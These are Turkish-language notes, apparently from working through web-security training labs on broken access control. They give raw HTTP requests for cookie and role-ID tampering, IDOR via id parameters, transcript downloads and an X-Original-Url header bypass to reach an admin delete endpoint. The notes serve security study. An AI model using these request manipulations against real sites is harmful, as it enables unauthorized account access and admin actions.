
## Lab 1 
`robots.txt` dosyası içerisinde `administrator-panel` izinli olmadığını göstermiş ancak bu bilgi sızıdırılmış şifre bile yok 

## Lab2
Sayfa kaynağı :
```html
<script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-llr373');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>
```

## Lab 3 

```http
GET /admin HTTP/2
Host: 0a8b009f04c396ba81d6162b007300ba.web-security-academy.net
Cookie: Admin=false; session=yktHjGrR42jMMST3p7ZywVndanq6zNVL
```
Admin true yap

## Lab 4

userid = 2 olarak değiştirmemi istiyor admin olablimek için 
e mail değiştirirken böyle bir cevap dönüyor 2 olarak değiştirip tekrar attığım zaman roleid 2 oluyorum
```json
{
"username": "wiener",
  "email": "adss@gmail.com",
  "apikey": "IZbhbnA1q2pbxpnNtKh3Vu7er0F3keTA",
  "roleid": 2
}
```

## Lab 5 
IDOR
```
https://0a9200ae04f7e268ab20ca96008d0054.web-security-academy.net/my-account?id=carlos
```

## Lab 6 
IDOR ama bu sefer diğer hesabların id sini farklı blog postları üzerinden bulabiliyorsun.

## Lab 7 
id değeri değiştirilip yollandığında redirect ederken 
```http
GET /my-account?id=carlos HTTP/2
Host: 0ab900000449707882aca266000b001c.web-security-academy.net
Cookie: session=HrgBiP2p94JFN510xAgWbqnWHRe9ZZcB
```
redirect edilirken bilgi sızdırılıyor.

```html
<div id=account-content>
 <p>Your username is: carlos</p>
<div>Your API Key is: FhvGGrhphf2VWG1hMWQ5xB5WmAxRGtG1</div>
```


## Lab 8 
IDOR var ve buradan şifreyi alabiliyoruz 

## Lab 9 
bu şekilde chat geçmişini indirdim burada şifresini yazmış eleman
```http
GET /download-transcript/1.txt HTTP/2
Host: 0afc00e503d0f625861fda2d00c6001c.web-security-academy.net
Cookie: session=1DICa1UimRY9VjLUoQBUe91uwEuyDVaY
```


## Lab 10 

```http
POST / HTTP/2
Host: 0a980019033822ca80124e4c008d005b.web-security-academy.net
X-Original-Url: /admin/delete?username=carlos
Content-Length: 15

username=carlos
```
